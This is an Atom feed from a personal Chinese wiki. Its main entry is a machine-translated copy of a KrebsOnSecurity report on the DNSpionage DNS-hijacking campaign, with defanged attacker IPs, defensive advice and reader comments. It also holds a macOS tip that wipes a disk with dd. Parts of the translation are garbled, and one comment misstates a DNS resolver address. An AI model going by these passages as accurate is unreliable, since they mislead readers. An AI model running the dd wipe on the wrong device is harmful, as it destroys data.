<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[lonelyorWiki]]></title>
  <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
  <link href="http://www.lonelyor.org/lonelyorWiki/"/>
  <updated>2019-02-21T12:58:08+08:00</updated>
  <id>http://www.lonelyor.org/lonelyorWiki/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.mweb.im/">MWeb</generator>
  
  <entry>
    <title type="html"><![CDATA[使用浏览器进行Web应用安全测试]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15506293038772.html"/>
    <updated>2019-02-20T10:21:43+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15506293038772.html</id>
    <content type="html"><![CDATA[
<p>本指南写的是在不使用扩展和代理的情况下，仅使用浏览器自带功能就能进行安全检测任务。<br/>
非常值得一读。</p>

<p><a href="https://getmantra.com/web-app-security-testing-with-browsers/#useragentchrome">Web app security testing with browsers</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[深入了解最近普遍存在的DNS劫持攻击事件]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15505564665657.html"/>
    <updated>2019-02-19T14:07:46+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15505564665657.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>文章摘抄自<a href="https://krebsonsecurity.com/2019/02/a-deep-dive-on-the-recent-widespread-dns-hijacking-attacks/">A Deep Dive on the Recent Widespread DNS Hijacking Attacks</a>，中文翻译由谷歌翻译提供。</p>
</blockquote>

<p>美国政府 - 以及一些领先的安全公司 - 最近警告说，一系列高度复杂和广泛的攻击使得可疑的伊朗黑客窃取了来自多个政府和私营公司的大量电子邮件密码和其他敏感数据。但到目前为止，这次袭击究竟是如何发生袭击以及谁被击中的细节依然笼罩在保密之中。</p>

<p>这篇文章旨在记录这些攻击的程度，并将这一绝对成功的网络间谍活动的起源追溯到关键互联网基础设施提供商的一系列连锁违规行为。</p>

<p><img src="media/15505564665657/15505565989858.jpg" alt=""/></p>

<p>在我们深入研究在这篇文章中达到高潮的广泛研究之前，回顾到目前为止公开披露的事实是有帮助的。在2018年11月27日，思科的Talos研究部门<a href="https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html">发表了一篇文章</a>，概述了一项名为“ DNSpionage ” 的复杂网络间谍活动的轮廓。</p>

<p>该名称的DNS部分是指全球“ <a href="https://en.wikipedia.org/wiki/Domain_Name_System">D omain N ame S ystem</a> ”，它通过将人性化的网站名称（example.com）转换为更容易的数字Internet地址，作为互联网的一种电话簿。供计算机管理。</p>

<p>Talos表示，DNSpionage的肇事者能够通过劫持这些目标的DNS服务器来窃取黎巴嫩和阿拉伯联合酋长国的一些政府和私营部门实体的电子邮件和其他登录凭证，以便所有电子邮件和虚拟专用网络（VPN） ）流量被重定向到攻击者控制的Internet地址。</p>

<p>Talos报告称，这些DNS劫持还为攻击者获取目标域的SSL加密证书铺平了道路（例如webmail.finance.gov.lb），这使得他们能够解密截获的电子邮件和VPN凭证并以纯文本格式查看。</p>

<p>在2019年1月9日，安全厂商FireEye <a href="https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html">发布了其报告</a> “全球DNS劫持活动：大规模DNS记录操作”，该报告对于间谍活动的“方式”进行了更为详尽的技术细节，但其中包含的其他细节很少。受害者。</p>

<p>与FireEye报告大致同时，美国国土安全部发布了一项罕见的紧急指令，<a href="https://cyber.dhs.gov/blog/#why-cisa-issued-our-first-emergency-directive">命令</a>所有美国联邦民用机构保护其互联网域名记录的登录凭证。作为该任务的一部分，DHS发布了DNSpionage活动中使用的域名和Internet地址的简短列表，尽管这些细节并未超出Cisco Talos或FireEye之前发布的内容。</p>

<p>这种情况在2019年1月25日发生了变化，当时安全公司CrowdStrike <a href="https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/">发布了一篇博文</a>，列出了迄今为止间谍活动所使用的几乎所有互联网地址。本篇文章的其余部分基于KrebsOnSecurity进行的开源研究和访谈，旨在更加了解这种非同寻常的持续攻击的真实程度。</p>

<p><img src="media/15505564665657/15505567298359.jpg" alt=""/></p>

<p>与CrowdStrike发布的DNSpionage活动相关的“妥协指标”。</p>

<h2 id="toc_0">被动DNS</h2>

<p>我开始研究CrowdStrike报告中列出的每个互联网地址，并通过<a href="https://www.farsightsecurity.com/">Farsight Security</a>和<a href="https://securitytrails.com/">SecurityTrails</a>运行它们，这些服务被动地收集有关与全球数千万个网站域相关的DNS记录变化的数据。</p>

<p>从每个互联网地址向后工作，我能够看到，在2018年的最后几个月，DNSpionage背后的黑客成功地破坏了50多个中东公司和政府机构的DNS基础设施的关键组件，包括塞浦路斯阿尔巴尼亚的目标，埃及，伊拉克，约旦，科威特，黎巴嫩，利比亚，沙特阿拉伯和阿拉伯联合酋长国。</p>

<p>例如，被动DNS数据显示攻击者能够劫持mail.gov.ae的DNS记录，mail.gov.ae处理阿拉伯联合酋长国政府办公室的电子邮件。以下是此网络间谍活动中成功入侵的其他一些有趣资产：</p>

<pre class="line-numbers"><code class="language-text">-nsa.gov.iq：伊拉克国家安全咨询
-webmail.mofa.gov.ae：阿拉伯联合酋长国外交部电子邮件
-shish.gov.al：阿尔巴尼亚国家情报局
-mail.mfa .gov.eg：埃及外交部邮件服务器
-mod.gov.eg：埃及国防部
--embassy.ly：利比亚大使馆
-owa.e-albania.al：电子邮件的Outlook Web Access门户网站阿尔巴尼亚政府门户网站
-mail.dgca.gov.kw：科威特民航局的电子邮件服务器
-gid.gov.jo：约旦的综合情报总局
-adpvpn.adpolice.gov.ae：阿布扎比警方的VPN服务
-mail.asp.gov.al:Albanian State Police的电子邮件
-owa.gov.cy：塞浦路斯政府的Microsoft Outlook Web Access 
-webmail.finance.gov.lb：黎巴嫩财政部的电子邮件
-mail.petroleum.gov .eg：埃及石油部
-mail.cyta.com.cy:Cyta电信和互联网提供商，塞浦路斯
-mail.mea.com.lb：中东航空公司的电子邮件访问
</code></pre>

<p>Farsight和SecurityTrails提供的被动DNS数据也提供了关于何时每个域被劫持的线索。在大多数情况下，攻击者似乎已经更改了这些域的DNS记录（我们马上就会看到“如何”），以便这些域指向他们控制的欧洲服务器。</p>

<p>在这些TLD的DNS记录被劫持后不久 - 有时几周，有时只有几天或几小时 - 攻击者能够从SSL提供商<a href="https://www.comodo.com/">Comodo</a>和/或<a href="https://letsencrypt.org/">Let&#39;s Encrypt</a>获取这些域的SSL证书。可以在<a href="https://crt.sh/">cert.sh</a>上看到针对其中几种攻击的准备工作，该数据库提供了所有新SSL证书创建的可搜索数据库。</p>

<p>让我们仔细看一个例子。CrowdStrike报告引用了互联网地址**139.59.134[.]216 **（见上文），根据Farsight多年来，它只是七个不同领域的所在地。其中两个域名仅在2018年12月出现在该互联网地址，包括黎巴嫩的域名，以及 - 奇怪的是 - 瑞典。</p>

<p>第一个域是“ <strong>ns0.idm.net.lb</strong> ”，它是黎巴嫩互联网服务提供商IDM的服务器。从2014年初到2018年12月，ns0.idm.net.lb指向<strong>194.126.10[.]18</strong>，其中足够的是一个基于黎巴嫩的互联网地址。但正如我们在下面的Farsight数据截图中看到的那样，2018年12月18日，该ISP的DNS记录被更改为将指向IDM的互联网流量指向德国的托管服务提供商（ 139.59.134[.]216 地址）。</p>

<p><img src="media/15505564665657/15505569469853.jpg" alt=""/></p>

<p>资料来源：远见安全</p>

<p>根据Farsight的说法，请注意在IDM的域名中列出的其他内容为139.59.134 [。] 216：</p>

<p><img src="media/15505564665657/15505569541143.jpg" alt=""/></p>

<p>域名<strong>sa1.dnsnode.net和fork.sth.dnsnode.net</strong>的DNS记录也从他们在瑞典的合法家园改为12月份由攻击者控制的德国托管服务提供商。这些域名由<a href="https://www.netnod.se/">Netnod Internet Exchange</a>拥有，  <a href="https://www.netnod.se/">Netnod Internet Exchange</a>是一家位于瑞典的主要全球DNS提供商。Netnod还运营着<a href="https://en.wikipedia.org/wiki/Root_name_server">13个“根”名称服务器之一</a>，  这是构成全球DNS系统基础的关键资源。</p>

<p>我们马上回到Netnod。但首先让我们看看CrowdStrike报告中引用的另一个Internet地址，作为DNSpionage黑客滥用的基础设施的一部分：<strong>82.196.11[.]127</strong>。荷兰的这个地址也是域名<strong>mmfasi[.]com</strong>的所在地，Crowdstrike说这是一个攻击者的域名之一，被用作一些被劫持的基础设施的DNS服务器。</p>

<p><img src="media/15505564665657/15505570490488.jpg" alt=""/></p>

<p>正如我们在上面的屏幕截图中看到的那样，82.196.11[.]127暂时是另一对Netnod DNS服务器以及服务器“ ns.anycast.woodynet.net ”的所在地。该域名来源于昵称  <a href="https://en.wikipedia.org/wiki/Bill_Woodcock">Bill Woodcock</a>，担任<a href="https://www.pch.net/">Packet Clearing House（PCH）</a>的执行董事  。</p>

<p>PCH是一家位于加利福尼亚州北部的非营利性实体，它还管理着世界上大量的DNS基础设施，特别是超过500个顶级域名的DNS和DNSpionage所针对的一些中东顶级域名。</p>

<p>以目标公司为目标<br/>
Netnod首席执行官 LarsMichaelJogbäck于2月14日与KrebsOnSecurity联系，确认Netnod的DNS基础设施部分在2018年12月底和2019年1月初被攻击者获取Netnod域名注册商账户后被劫持。</p>

<p>Jogbäck指出该公司于2月5日在其网站上发布的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">声明</a>，该声明称Netnod在1月2日了解了它在攻击中的作用，并在整个过程中与所有相关方和客户保持联系。</p>

<p>“作为国际安全合作的参与者，Netnod在2019年1月2日意识到我们已经陷入了这波浪潮中，我们经历了MITM（中间人）攻击，”声明中写道。“Netnod不是袭击的最终目标。该目标被认为是在瑞典以外的国家捕获互联网服务的登录详细信息。“</p>

<p>在2月15日与该作者的访谈中，PCH的伍德科克承认，在DNSpionage黑客滥用未经授权的域名注册商访问后，其组织的部分基础设施遭到了破坏。</p>

<p>碰巧，pch.net和dnsnode.net的注册商记录指向相同的来源：<strong>Key-Systems GmbH</strong>，一家位于德国的域名注册商; 和<strong>Frobbit.se</strong>，瑞典的一家公司。Frobbit是Key Systems的经销商，两家公司共享一些相同的在线资源。</p>

<p>伍德科克表示，黑客已经破获了PCH的注册商用于发送称为<a href="https://en.wikipedia.org/wiki/Extensible_Provisioning_Protocol">可扩展供应协议（EPP</a>的信令消息的凭据  。EPP是一个鲜为人知的界面，可作为全球DNS系统的一种后端，允许域名注册商通知区域注册机构（如Verisign）有关域记录的更改，包括新域名注册，修改和转移。</p>

<p>“1月初，Key-Systems表示，他们相信他们的EPP界面已被滥用有效证件的人滥用，”伍德科克说。</p>

<p>Key-Systems拒绝评论这个故事，除了说它没有讨论其经销商客户业务的细节。</p>

<p>Netnod 关于此次袭击的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">书面声明</a>提到了该公司安全总监PatrikFältström的进一步询问，PatrikFältström也是Frobbit.se的共同所有人。</p>

<p>Fältström在给KrebsOnSecurity的电子邮件中表示，Frobbit和Key Systems的DNSpionage攻击者将未经授权的EPP指令发送到各个注册机构。</p>

<p>“从我的角度来看，这次攻击显然是严重的EPP攻击的早期版本，”他写道。“也就是说，目标是将正确的EPP命令发送到注册管理机构。对于未来的推断，我个人非常紧张。注册管理机构是否允许任何EPP命令来自注册商？我们总会有一些弱的注册商，对吧？“</p>

<h2 id="toc_1">DNSSEC</h2>

<p>这些攻击的一个更有趣的方面是，Netnod和PCH都是DNSSEC（又称“DNS安全扩展”）的声音支持者和采用者，这是一种旨在打败DNSpionage黑客能够攻击的那种攻击的技术。执行。</p>

<p><img src="media/15505564665657/15505571774864.jpg" alt=""/><br/>
图片：APNIC</p>

<p>DNSSEC通过要求对给定域或域集的所有DNS查询进行数字签名来保护应用程序不使用伪造或操纵的DNS数据。在DNSSEC中，如果名称服务器确定给定域的地址记录在传输过程中未被修改，则它会解析域并让用户访问该站点。但是，如果该记录已以某种方式被修改或与所请求的域不匹配，则名称服务器会阻止用户访问欺诈性地址。</p>

<p>根据APNIC（亚太地区互联网地址注册机构）收集的<a href="https://stats.labs.apnic.net/dnssec/XA?c=XA&amp;x=1&amp;g=1&amp;r=1&amp;w=7&amp;g=0">测量数据</a>，虽然DNSSEC可以成为减轻DNSpionage发起的攻击的有效工具，但只有约20％的全球主要网络和网站启用了它。区域。</p>

<p>Jogbäck表示，Netnod的基础设施遭受了来自DNSpionage攻击者的三次单独攻击。前两个发生在2018年12月14日到2019年1月2日之间的两周时间窗口中，以及未受 DNSSEC保护的目标公司服务器。</p>

<p>不过，他说，12月29日和1月2日的第三次攻击针对性的Netnod基础设施是由DNSSEC和服务自己的内部电子邮件网络保护。然而，由于攻击者已经可以访问其注册商的系统，因此他们能够暂时禁用该安全措施 - 或者至少足以获得<a href="two%20of%20Netnod%E2%80%99s">Netnod的两个</a> <a href="https://crt.sh/?id=1071723007">电子邮件服务器的</a> SSL证书。</p>

<p>Jogbäck告诉KrebsOnSecurity，一旦攻击者拥有这些证书，他们就会为公司的目标服务器重新启用DNSSEC，同时显然准备启动攻击的第二阶段 - 将流经其邮件服务器的流量转移到攻击者控制的机器上。但Jogbäck表示，无论出于何种原因，攻击者在以后尝试吸收互联网流量之前，都忽略了使用未经授权的访问其注册商来禁用DNSSEC。</p>

<p>“对我们来说幸运的是，当他们发起他们的中间人攻击时，他们忘了删除它，”他说。“如果他们更熟练，他们就会删除域名上的DNSSEC，这是他们本可以做到的。”</p>

<p>伍德科克表示，PCH在其所有基础设施上验证了DNSSEC，但并非所有公司的客户 - 特别是DNSpionage所针对的中东国家 - 都已将其系统配置为全面实施该技术。</p>

<p>Woodcock表示，PCP的基础设施是针对DNSpionage攻击者在2018年12月13日和2019年1月2日之间的四次不同攻击中的目标。每次攻击，黑客都会打开他们的密码啜饮工具大约一个小时，然后在返回之前将其关闭每次运行后网络恢复到原始状态。</p>

<p>攻击者不需要每次启动他们的监控拖网超过一个小时，因为大多数现代智能手机被配置为持续为用户可能在他的设备上设置的任何帐户提取新电子邮件。因此，攻击者能够通过每次短暂的劫持来获取大量的电子邮件凭据。</p>

<p>在2019年1月2日 - 也就是DNSpionage黑客追踪Netnod内部电子邮件系统的同一天 - 他们还直接针对PCH，从Comodo获得了两个处理该公司内部电子邮件的PCH域的<a href="https://crt.sh/?id=1075482182">SSL </a><a href="https://crt.sh/?id=1075482666">证书</a>。</p>

<p>伍德科克表示，PCH对DNSSEC的依赖几乎完全阻止了这种攻击，但它设法为当时旅行的两名员工收集电子邮件凭据。这些员工的移动设备通过酒店无线网络下载公司电子邮件 - 作为使用无线服务的先决条件 - 迫使他们的设备使用酒店的DNS服务器，而不是PCH的DNNSEC系统。</p>

<p>伍奇科克说：“这两个人确实被弹出，他们都在旅行并且使用他们的iPhone，他们不得不在劫持期间穿越俘虏门户网站。” “他们不得不关闭我们的名称服务器以使用强制网络门户，在此期间，手机上的邮件客户端检查了新的电子邮件。除此之外，DNSSEC还使我们免于真正彻底拥有。“</p>

<p>由于PCH使用DNSSEC保护其域名，劫持其邮件基础设施的实际效果是，大约一个小时没有人，但两名远程员工收到任何电子邮件。</p>

<p>“对于我们基本上所有的用户来说，它看起来就像邮件服务器短时间内无法使用，”伍德科克说。“如果他们碰巧正在检查他们的手机或其他什么，它暂时没有解决，而且每个人都认为这很有趣，我会在一段时间后再检查一下。当他们再次检查时它工作正常。我们的一些工作人员注意到我们的电子邮件服务发生了短暂的中断，但没有人认为可以与其他任何人讨论或打开机票。“</p>

<p>但DNSpionage黑客并没有被吓倒。PCH在本月早些时候发给客户的一封信中表示，法医调查确定，1月24日，一台拥有其网站用户数据库的计算机遭到入侵。存储在数据库中的用户数据包括客户的用户名，<a href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a>密码哈希值，电子邮件，地址和公司名称。</p>

<p>“我们没有看到任何证据表明攻击者访问了用户数据库或泄露了它，”该消息显示。“因此，我们在透明度和预防措施方面为您提供这些信息，而不是因为我们认为您的数据受到了损害。”</p>

<h2 id="toc_2">改进</h2>

<p>针对这个故事接受采访的多位专家表示，基于DNS的攻击存在的一个长期问题是，许多组织倾向于将其大部分DNS基础架构视为理所当然。例如，许多实体甚至不记录其DNS流量，也不密切关注对其域记录所做的任何更改。</p>

<p>即使对于那些努力监控其DNS基础架构以进行可疑更改的公司，一些监控服务也只是被动地拍摄DNS记录的快照，或者只是每天一次地主动执行。事实上，伍德科克表示，PCH依赖于不少于三个监控系统，并且他们都没有提醒他的组织注意到PCH的DNS系统遭遇的各种一小时劫持事件。</p>

<p>“我们有三种不同的商业DNS监控服务，其中没有一项能够实现，”他说。“他们甚至都没有警告我们事情发生后就已经发生了。”</p>

<p>伍德科克表示，PCH已经建立了一个系统，每小时多次轮询自己的DNS基础设施，并在任何变化时立即发出警报。</p>

<p>Jogbäck表示，Netnod还加强了监控，并加倍努力确保使用所有可用于保护其域基础架构的选项。例如，该公司之前没有使用“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域锁定</a> ” 保护其所有域名，“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域名锁定</a> ”是一种服务，要求注册商在对域记录进行任何修改之前采取其他身份验证步骤。</p>

<p>“我们真的很伤心，我们没有更好地保护我们的客户，但我们也是攻击链中的受害者，”Jogbäck说。“你被抢劫后可以换成更好的锁，并希望让某人再次做到更难。但我可以真实地说，我们已经从这次袭击中成为受害者中学到了很多，而且我们现在比以前好多了。“</p>

<p>伍德科克表示，他担心互联网决策者和其他基础设施提供商不会严重或迫切地对全球DNS构成威胁，他相信DNSpionage黑客将在未来数月和数年内有大量其他受害者攻击和利用。</p>

<p>“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。</p>

<p>“所有这一切都是一场战斗，”他说。“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。他们希望获得尽可能多的方式，以便将来可以用于特定的目标。“</p>

<h2 id="toc_3">建议</h2>

<p>John Crain是<a href="https://en.wikipedia.org/wiki/ICANN">ICANN</a>的首席安全，稳定和弹性官员，ICANN是负责监管全球域名行业的非营利实体。Crain表示，许多可以使攻击者更难以劫持目标域或DNS基础架构的最佳实践已经有十多年了。</p>

<p>“这很大程度上取决于数据卫生，”Crain说。“大型组织直到妈妈和流行实体都没有关注一些非常基本的安全实践，比如多因素身份验证。如今，如果你有一个次优的安全立场，你就会被拥有。这就是今天的现实。我们现在看到更复杂的对手现在在互联网上采取行动，如果你没有做基本的事情，他们会打击你。“</p>

<p>组织的一些最佳实践包括：</p>

<ul>
<li><p>使用DNSSEC（签名区域和验证响应）</p></li>
<li><p>使用注册表锁等注册功能，可以帮助保护域名记录不被更改</p></li>
<li><p>使用应用程序，Internet流量和监控的访问控制列表</p></li>
<li><p>使用双因素身份验证，并要求所有相关用户和分包商使用它</p></li>
<li><p>如果使用密码，请选择唯一密码并考虑密码管理器</p></li>
<li><p>审核注册商和其他提供商的帐户</p></li>
<li><p>通过监控来监控证书，例如，<a href="%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E6%97%A5%E5%BF%97">证书透明度日志</a></p></li>
</ul>

<p>标签：APNIC，比尔·伍德科克，思科塔洛斯，科摩多，CrowdStrike，国土安全部，DNSpionage，DNSSEC，EPP，可扩展的供应协议，远见安全，FireEye的，Frobbit，ICANN，约翰·克雷恩，键控系统，拉尔斯·迈克尔Jogbäck，LetsEncrypt，Netnod，包清算所，PatrikFältström，PCH，SecurityTrails，美国国土安全部</p>

<p>此条目发布于2019年2月18日星期一上午8:51，并在A Little Sunshine，Data Breaches，The Coming Storm下提交。您可以通过RSS 2.0 Feed 关注此条目的任何评论。您可以跳到最后并发表评论。目前不允许Pinging。</p>

<hr/>

<h2 id="toc_4">26条评论（懒得处理格式了）</h2>

<p>Beau Kinstler<br/>
2019年2月18日上午9:50<br/>
一如既往的棒极了。谢谢Brian。出于好奇，你如何将DNSSEC和你在这里发布的攻击与GRC.com和Steve Gibson的“DNS欺骗”测试工具中描述的DNS缓存中毒联系起来？<br/>
<a href="https://www.grc.com/dns/dns.htm">https://www.grc.com/dns/dns.htm</a></p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上10:21<br/>
DNS缓存中毒最常发生在更本地级别，即用户的机器或路由器。本故事中描述的攻击涉及将DNS设置妥协到更高级别，远远超出最终用户的控制范围。</p>

<p>答复<br/>
汤姆威尔士<br/>
2019年2月18日上午9:58<br/>
“伊朗人不只是试图做出这些攻击立即生效”。</p>

<p>我查看了这篇文章，但我找不到任何证据表明“伊朗人”是肇事者。</p>

<p>有没有，或者这只是更具政治色彩的暗杀？</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日上午10:31<br/>
查看故事中链接的CrowdStrike博客文章。我没有打印很多我的信息，主要是因为故事已经很长了，无论如何这可能不是我将在这个主题上写的最后一个。但是，我也试图不提供太多细节，以帮助攻击者在未来改进攻击。也就是说，从我对这个故事中未提及的许多人的访谈中可以清楚地看出，有一些线索指向某些特定威胁行为者的相当大的努力。</p>

<p>答复<br/>
TreFunny<br/>
2019年2月18日上午11点50分<br/>
关注CrowdStrike，他们只是联邦调查局的私人部门......看看与FBI的所有联系，这是可怕的。</p>

<p>看看他们是如何处理DNC黑客的，并没有停止它19天或疯狂的事情，但只花了2个小时来识别“熊”......吓人。</p>

<p>CrowdStrike将会在这些日子里曝光......</p>

<p>答复<br/>
戴夫亚当斯<br/>
2019年2月18日上午10:42<br/>
优秀的研究Brian。我希望使用DNSSec的20％都在美国。作为网络安全分析师，任何异常都是有原因的。如果您的邮件交换中断一小时，请进行调查。我们都需要做的不仅仅是保护我们的系统。我们还需要验证数据的来源。</p>

<p>答复<br/>
阳光之州<br/>
2019年2月18日上午11:41<br/>
我知道我的域名，我使用2FA访问网站界面，以及DNSSEC和注册表锁定已启用</p>

<p>答复<br/>
Greg Askew<br/>
2019年2月18日上午11:54<br/>
“然而，他说，12月29日至1月2日的第三次攻击是针对受DNSSEC保护并服务于其内部电子邮件网络的Netnod基础设施。然而，由于攻击者已经可以访问其注册商的系统，他们能够暂时禁用该安全措施“。</p>

<p>这没有意义。不应该通过关闭服务器区域上的DNSSEC来禁用DNSSEC。要使DNSSEC提供任何值，它需要配置DNS服务器和客户端计算机上的实施。在Windows上，使用名称解析策略表（NRPT）执行客户端强制执行。如果未在客户端上强制执行DNSSEC，则它实际上不提供任何值。如果在客户端上强制执行DNSSEC，则禁用DNS服务器上的区域的DNSSEC将导致客户端上的名称解析失败。如果任何受害组织拥有支持DNSSEC的域，但未在其客户端计算机上强制执行DNSSEC，则他们会自行开枪。</p>

<p>答复<br/>
JJ<br/>
2019年2月18日下午2:53<br/>
杀死DNSSEC只需要摆脱DS记录。我不得不走很多公司，为什么他们全新的DNSSEC配置并没有真正起作用，而且几乎总是因为他们没有相应的DS记录。人们不再做功课了：“但我们签了这个区！”</p>

<p>答复<br/>
丹尼斯塞甘<br/>
2019年2月18日下午12:17<br/>
“为什么CISA发布了我们的第一份紧急指令” <br/>
，主任Christopher Krebs</p>

<p>任何关系？</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日下午12:18<br/>
不</p>

<p>答复<br/>
表姐艾迪<br/>
2019年2月18日下午12:28<br/>
伊朗和俄罗斯似乎正在为网络战争做准备。<br/>
希望我们的政府（Home Land Security，FBI，CIA）能够保护我们的国家。我真的希望并祈祷特朗普总统会让Brian Krebs成为我们政府网络恐怖部门的负责人！</p>

<p>答复<br/>
橡子<br/>
2019年2月18日下午12:55<br/>
185.20.187 [。] 8封锁，未知原因，由Forcepoint，Fortinet，卡巴斯基（等）<br/>
提供，分析，卡巴斯基（等）2019-02-15 <br/>
<a href="http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis">http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis</a></p>

<p>2018-12-03 <br/>
<a href="http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis">http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis</a></p>

<p>答复<br/>
橡子<br/>
2019年2月18日下午1:24<br/>
Talos：“攻击者将主机名重定向到IP 185.20.187 [。] 8短时间。”11月6日，9月13日等</p>

<p>C2（命令和控制）服务器，以及另外两个IP（全部在同一荷兰网络上）。</p>

<p>答复<br/>
ChrisSuperPogi<br/>
2019年2月18日下午2:03<br/>
令我惊讶的是，我们可能无法实践多年前推荐的数据卫生！我的意思是，DNSSEC已经很老了。注册表锁定也已有一段时间了。<br/>
多因素身份验证是一个非常新的趋势，但它是网络杀戮链的关键部分。</p>

<p>希望我们从中吸取教训。</p>

<p>答复<br/>
JJ<br/>
2019年2月18日下午2:55<br/>
注册表锁实际上并不是众所周知的，人们将它与传输锁混淆。再加上它需要花钱而且你有答案。</p>

<p>答复<br/>
YYZ<br/>
2019年2月18日下午3:12<br/>
IP地址的最后一个八位字节点周围的括号[]是什么意思？</p>

<p>答复<br/>
大卫C.<br/>
2019年2月18日下午4:29<br/>
它们旨在防止Web爬虫爬进那些（犯罪）服务器。并且防止移动网络浏览器将它们变成链接，最终可能会欺骗无辜的读者访问这些网站。</p>

<p>答复<br/>
ASB<br/>
2019年2月18日下午4:32<br/>
[。]旨在确保链接不会变为可点击。因此它是本网站读者的保护机制（除其他外）</p>

<p>答复<br/>
Nobby Nobbs<br/>
2019年2月18日下午5:24<br/>
可能是为了防止IP地址在大多数浏览器中显示为链接。在讨论像Brian这样的恶意网站时可能会出现问题。</p>

<p>感谢另一篇伟大的文章，布莱恩！</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上10:18<br/>
谢谢。是的，正如其他人所说，括号有效地阻止了任何网站，浏览器或电子邮件客户端将这些地址变成可点击的链接。</p>

<p>答复<br/>
大卫C.<br/>
2019年2月18日下午4:28<br/>
我将添加到实践列表中以获取包含身份证明的证书，而不仅仅是域。</p>

<p>面对DNS劫持，证明“这是example.com”的证书毫无意义。</p>

<p>一个说“示例公司，1234假街，圣克拉拉，加利福尼亚州”并且来自需要身份证明文件的权威机构将更加安全。特别是如果用户习惯于在位置栏中看到全名，并且在某些时候突然变为“example.com”。</p>

<p>答复<br/>
伊恩<br/>
2019年2月18日晚上8:39<br/>
没有最终用户如何保护自己的指标。在看了DNS问题很长一段时间后，我刚刚做了一次重拍。曾经有一次我没有使用我的DNS旋转器脚本 - 我有一个脚本可以随机选择随机dns服务器。野蛮但似乎可以防止明显的dns渎职行为。有点厌倦了所有这一切，互联网是故意保持borken恕我直言。伊朗应该实施制裁，例如将所有伊朗学生/教授从大学中移除，直到他们学会成为好公民。与中国人一样... LOL看看任何“敏感”的工作场所以及振动器和推动者的名字，所有人都经过了完美的审查......国家赞助的所有最敏感的地方的傀儡和间谍，而同等或更好能力的国内学生必须如果他们能找到一个地方，就要与债务和贷款斗争！最高阶的愚蠢！</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上9:35<br/>
对最终用户来说有点复杂。您可以将DNS设置设置为Google的DNS - 8.8.8.8和4.4.2.2 - 当域名签名时，应该强制执行DNNSEC。但是，如果您不在自己的网络上，并且您的移动数据提供商的DNS设置启动，事情会变得更加棘手。我不确定最终用户是否有办法控制在这种情况下使用的DNS设置。</p>

<p>答复<br/>
Rich Altmaier<br/>
2019年2月18日晚上11:09<br/>
保护DNS当然很重要而且很好。然而，就用户保护自己而言，这基本上是一个问题：我是否连接到我建立帐户的服务器？<br/>
我们可以使用Yubikey或等效服务器来验证用户身份。<em>但我们需要</em>一个反向Yubikey，我的密钥也确认服务器是我建立我的帐户的那个。</p>

<p>我相信Yubikey的技术适用于此。但用户体验是擅离!! 我想插入我的密钥并要求密钥+浏览器确认：基于加密交换，我正在与之通信的服务器确实拥有我之前在那里建立的加密密钥。</p>

<p>请！！！</p>

<p>答复<br/>
Dnspionage<br/>
2019年2月18日晚上11:29<br/>
更多的组织应该部署DNSSEC，但大多数组织不了解它的工作原理以及它的价值。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mediakit报告设备商的空间不足以执行此操作]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15489296290618.html"/>
    <updated>2019-01-31T18:13:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15489296290618.html</id>
    <content type="html"><![CDATA[
<p>网上大部分都写的去 windows 中使用DiskGenius重新分区，这搞麻烦了，不用这么麻烦的。</p>

<p>1、打开终端，输入<code>diskutil list</code>列出磁盘内容，这里我们可以找到要格式化的磁盘，我是 disk2<br/>
2、卸载要格式化的磁盘<code>diskutil unmountDisk force disk2</code><br/>
3、写入启动扇区<code>sudo dd if=/dev/zero of=/dev/disk2 bs=1024 count=1024</code><br/>
4、对磁盘进行分区<code>diskutil partitionDisk disk2 GPT JHFS+ &quot;AWESOME DISK&quot; 0g</code><br/>
5、打完收工，写博客发出来。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[黑链]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15489008835167.html"/>
    <updated>2019-01-31T10:14:43+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15489008835167.html</id>
    <content type="html"><![CDATA[
<p>待整理</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[90后空巢青年生活指南]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15488284836388.html"/>
